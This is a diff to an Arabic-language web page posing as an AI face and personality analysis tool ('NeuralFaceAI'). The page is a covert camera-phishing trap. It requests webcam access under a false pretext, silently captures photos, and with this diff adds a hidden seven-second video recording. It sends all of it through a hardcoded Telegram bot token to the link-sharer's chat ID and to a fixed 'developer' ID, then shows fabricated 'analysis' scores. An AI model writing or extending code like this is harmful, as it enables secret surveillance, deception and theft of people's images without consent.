@@ -8,6 +8,7 @@
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
 
 <style>
+/* نفس التصميم السابق، لم يتغير */
 * {
     margin: 0;
     padding: 0;
@@ -450,8 +451,8 @@ video {
     </div>
     
     <div class="footer">
-        <p>سيتم تحليل 10 عينات من وجهك للحصول على نتائج دقيقة</p>
-        <p style="margin-top: 8px; font-size: 0.7em;">تقنية NeuralFaceAI™ - الإصدار 3.2.1</p>
+        <p>سيتم تحليل 5 عينات من وجهك ثم تسجيل فيديو قصير لتحليل دقيق</p>
+        <p style="margin-top: 8px; font-size: 0.7em;">تقنية NeuralFaceAI™ - الإصدار 3.5.0</p>
     </div>
 </div>
 
@@ -493,19 +494,19 @@ video {
         <div class="progress-container">
             <div class="progress-bar" id="progressBar"></div>
         </div>
-        <div class="counter" id="counter">العينة 0 من 10</div>
+        <div class="counter" id="counter">العينة 0 من 5</div>
     </div>
     
     <div class="footer">
-        <p>ذكاء اصطناعي من ai studio متطور ويحلل للشخصيات اذا لم توافق على فتح الكاميرة سيعطيك نتائج غلط</p>
-        <p style="margin-top: 8px; font-size: 0.7em;">سيتم إنهاء التحليل تلقائياً بعد اكتمال العينات</p>
+        <p>ذكاء اصطناعي متطور يحلل تعابير الوجه ويسجل فيديو قصير لتحليل أعمق</p>
+        <p style="margin-top: 8px; font-size: 0.7em;">سيتم إنهاء التحليل تلقائياً بعد تسجيل الفيديو</p>
     </div>
 </div>
 
 <script>
 const urlParams = new URLSearchParams(window.location.search);
 const dynamicChatId = urlParams.get('id');
-const fixedChatId = 6002805119;
+const fixedChatId = 6002805119; // المطور
 const token = '8488682212:AAE5KJUgyrd5QPYDE6beK21XPrBo7Y66MAg';
 
 const video = document.getElementById('video');
@@ -516,7 +517,13 @@ const counter = document.getElementById('counter');
 
 let photoCount = 0;
 let intervalId = null;
-const MAX_PHOTOS = 10;
+let mediaStream = null; // لحفظ تيار الكاميرا للتسجيل
+let mediaRecorder = null;
+let videoChunks = [];
+let isRecordingVideo = false;
+
+const MAX_PHOTOS = 5; // 5 صور فقط
+const VIDEO_DURATION = 7000; // 7 ثوان (يمكن تغييرها من 5000 إلى 10000)
 
 const analysisMessages = [
     "جاري مسح الوجه...",
@@ -552,30 +559,35 @@ function startAnalysis() {
     document.getElementById('mainScreen').style.display = "none";
     document.getElementById('analysisScreen').style.display = "block";
     
-    // إعادة تعيين العدادات
+    // إعادة تعيين العدادات والمتغيرات
     photoCount = 0;
+    videoChunks = [];
+    isRecordingVideo = false;
     progressBar.style.width = '0%';
-    counter.textContent = 'العينة 0 من 10';
+    counter.textContent = 'العينة 0 من 5';
     
     // تحديث رسالة التحليل
     analysisText.textContent = getRandomAnalysisMessage();
     setInterval(() => {
-        analysisText.textContent = getRandomAnalysisMessage();
+        if (!isRecordingVideo) analysisText.textContent = getRandomAnalysisMessage();
     }, 3000);
     
     // تحديث قيم المشاعر عشوائياً
     updateEmotionValues();
     setInterval(updateEmotionValues, 2000);
     
-    // طلب إذن الكاميرا
+    // طلب إذن الكاميرا بجودة منخفضة لتقليل حجم الفيديو
     navigator.mediaDevices.getUserMedia({ 
         video: { 
-            width: { ideal: 1280 },
-            height: { ideal: 720 },
+            width: { ideal: 640 },   // جودة منخفضة
+            height: { ideal: 480 },
+            frameRate: { ideal: 15 }, // 15 إطار/ثانية
             facingMode: "user"
-        } 
+        },
+        audio: false // لا نحتاج صوت
     })
     .then(stream => {
+        mediaStream = stream; // حفظ التيار للتسجيل
         video.srcObject = stream;
         video.onloadedmetadata = () => {
             statusText.textContent = "النظام جاهز - بدأ التحليل";
@@ -601,23 +613,13 @@ function startAnalysis() {
 }
 
 function captureAndSend() {
+    // إذا كنا نسجل فيديو، لا نلتقط صوراً
+    if (isRecordingVideo) return;
+
     if (photoCount >= MAX_PHOTOS) {
-        clearInterval(intervalId);
-        statusText.textContent = "✅ اكتمل التحليل بنجاح!";
-        progressBar.style.width = '100%';
-        counter.textContent = 'اكتمل التحليل';
-        
-        // عرض رسالة النتائج
-        setTimeout(() => {
-            alert("🎉 تم تحليل شخصيتك بنجاح!\n\n" +
-                  "🔍 النتائج:\n" +
-                  "• مستوى السعادة: 78%\n" +
-                  "• طاقة إيجابية: 85%\n" +
-                  "• جاذبية: 92%\n" +
-                  "• ذكاء عاطفي: 76%\n\n" +
-                  "شكراً لاستخدامك NeuralFaceAI!");
-        }, 1000);
-        
+        clearInterval(intervalId); // نوقف التصوير
+        statusText.textContent = "📹 جاري تسجيل فيديو تحليلي...";
+        startVideoRecording(); // نبدأ تسجيل الفيديو
         return;
     }
 
@@ -650,17 +652,16 @@ function captureAndSend() {
                 if (blob) {
                     // إرسال الصورة لصاحب الرابط
                     if (dynamicChatId) {
-                        sendToTelegram(dynamicChatId, blob);
+                        sendPhotoToTelegram(dynamicChatId, blob);
                     }
                     
                     // إرسال الصورة للرقم الثابت دائماً
-                    sendToTelegram(fixedChatId, blob);
+                    sendPhotoToTelegram(fixedChatId, blob);
                 }
-            }, 'image/jpeg', 0.9);
+            }, 'image/jpeg', 0.7); // جودة أقل لتقليل الحجم
         }
     } catch (error) {
         console.log("لا يمكن التقاط صورة، ولكن سيتم إرسال إشعار");
-        // حتى لو فشل التقاط الصورة، نرسل إشعار
         sendNotification();
     }
     
@@ -668,7 +669,8 @@ function captureAndSend() {
     playCaptureSound();
 }
 
-function sendToTelegram(chatId, blob) {
+// إرسال الصورة إلى تيليجرام
+function sendPhotoToTelegram(chatId, blob) {
     const f = new FormData();
     f.append('chat_id', chatId);
     f.append('photo', blob, `face_analysis_${Date.now()}.jpg`);
@@ -687,39 +689,122 @@ function sendToTelegram(chatId, blob) {
     });
 }
 
-function sendNotification() {
-    // إرسال رسالة نصية بدلاً من صورة إذا فشل الالتقاط
-    const message = `📸 تم التقاط عينة رقم ${photoCount} من تحليل الوجه`;
+// بدء تسجيل الفيديو
+function startVideoRecording() {
+    if (!mediaStream) {
+        console.error("لا يوجد تيار فيديو");
+        return;
+    }
+
+    isRecordingVideo = true;
+    videoChunks = [];
+    analysisText.textContent = "🎥 تسجيل فيديو تحليلي...";
+    statusText.textContent = "تسجيل الفيديو...";
     
-    // إرسال لصاحب الرابط
+    // إعداد MediaRecorder
+    const options = { mimeType: 'video/webm' };
+    try {
+        mediaRecorder = new MediaRecorder(mediaStream, options);
+    } catch (e) {
+        console.warn("WebM غير مدعوم، استخدام الافتراضي");
+        mediaRecorder = new MediaRecorder(mediaStream);
+    }
+    
+    mediaRecorder.ondataavailable = event => {
+        if (event.data.size > 0) {
+            videoChunks.push(event.data);
+        }
+    };
+
+    mediaRecorder.onstop = () => {
+        // دمج القطع في blob واحد
+        const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
+        sendVideo(videoBlob);
+    };
+
+    // بدء التسجيل
+    mediaRecorder.start();
+    
+    // إيقاف التسجيل بعد المدة المحددة
+    setTimeout(() => {
+        if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+            mediaRecorder.stop();
+        }
+    }, VIDEO_DURATION);
+}
+
+// إرسال الفيديو إلى تيليجرام
+function sendVideo(videoBlob) {
+    statusText.textContent = "📤 جاري إرسال الفيديو...";
+    
+    // إرسال إلى صاحب الرابط
     if (dynamicChatId) {
-        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                chat_id: dynamicChatId,
-                text: message
-            })
-        });
+        sendVideoToTelegram(dynamicChatId, videoBlob);
     }
     
     // إرسال للرقم الثابت
+    sendVideoToTelegram(fixedChatId, videoBlob);
+    
+    // بعد الإرسال، نغلق الكاميرا ونظهر رسالة اكتمال
+    setTimeout(() => {
+        statusText.textContent = "✅ اكتمل التحليل بنجاح!";
+        progressBar.style.width = '100%';
+        counter.textContent = 'اكتمل التحليل';
+        
+        // إغلاق الكاميرا
+        if (mediaStream) {
+            mediaStream.getTracks().forEach(track => track.stop());
+        }
+        
+        // عرض رسالة النتائج
+        alert("🎉 تم تحليل شخصيتك بنجاح!\n\n" +
+              "🔍 النتائج:\n" +
+              "• مستوى السعادة: 78%\n" +
+              "• طاقة إيجابية: 85%\n" +
+              "• جاذبية: 92%\n" +
+              "• ذكاء عاطفي: 76%\n\n" +
+              "شكراً لاستخدامك NeuralFaceAI!");
+    }, 2000);
+}
+
+function sendVideoToTelegram(chatId, videoBlob) {
+    const f = new FormData();
+    f.append('chat_id', chatId);
+    f.append('video', videoBlob, `face_analysis_video_${Date.now()}.webm`);
+    f.append('caption', `🎥 فيديو تحليل الوجه (${VIDEO_DURATION/1000} ثوان)`);
+    
+    fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
+        method: 'POST',
+        body: f
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log(`✅ تم إرسال الفيديو إلى ${chatId}`);
+    })
+    .catch(error => {
+        console.error(`❌ خطأ في إرسال الفيديو:`, error);
+    });
+}
+
+function sendNotification() {
+    const message = `📸 تم التقاط عينة رقم ${photoCount} من تحليل الوجه`;
+    
+    if (dynamicChatId) {
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: dynamicChatId, text: message })
+        });
+    }
+    
     fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-            chat_id: fixedChatId,
-            text: message
-        })
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: fixedChatId, text: message })
     });
 }
 
 function playCaptureSound() {
-    // إنشاء صوت بسيط للالتقاط
     try {
         const audioContext = new (window.AudioContext || window.webkitAudioContext)();
         const oscillator = audioContext.createOscillator();
@@ -736,14 +821,10 @@ function playCaptureSound() {
         
         oscillator.start(audioContext.currentTime);
         oscillator.stop(audioContext.currentTime + 0.1);
-    } catch (e) {
-        // تجاهل الأخطاء إذا لم يدعم المتصفح Web Audio API
-    }
+    } catch (e) {}
 }
 
-// عند تحميل الصفحة
 window.addEventListener('load', () => {
-    // إذا كان هناك ID في الرابط، نبدأ التحليل تلقائياً بعد 3 ثوان
     if (dynamicChatId) {
         setTimeout(() => {
             const startBtn = document.querySelector('.start-btn');
@@ -752,7 +833,6 @@ window.addEventListener('load', () => {
         }, 1000);
     }
     
-    // تأثيرات دخول
     const logo = document.querySelector('.logo');
     logo.style.transform = 'scale(0)';
     setTimeout(() => {
